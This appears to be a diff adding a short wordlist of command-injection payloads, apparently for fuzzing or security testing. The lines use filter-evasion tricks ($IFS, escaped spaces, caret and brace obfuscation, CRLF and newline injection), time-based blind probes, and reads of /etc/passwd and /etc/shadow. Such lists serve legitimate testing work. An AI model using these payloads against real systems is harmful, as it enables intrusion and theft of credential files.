@@ -1,0 +1,13 @@
+X=$'uname\x20-a'&&$X
+ls${IFS}-la
+cat</etc/passwd
+ping%CommonProgramFiles:~10,-18%127.0.0.1
+powershell -Command "Start-Sleep -s 10"
+password%0d%0acalc.exe
+node -e "console.log(require('fs').readFileSync('/etc/shadow','utf8'))"
+& ping -n 5 127.0.0.1
+who^ami
+;sleep 5;
+`id`
+%0Aid
+;{id,}
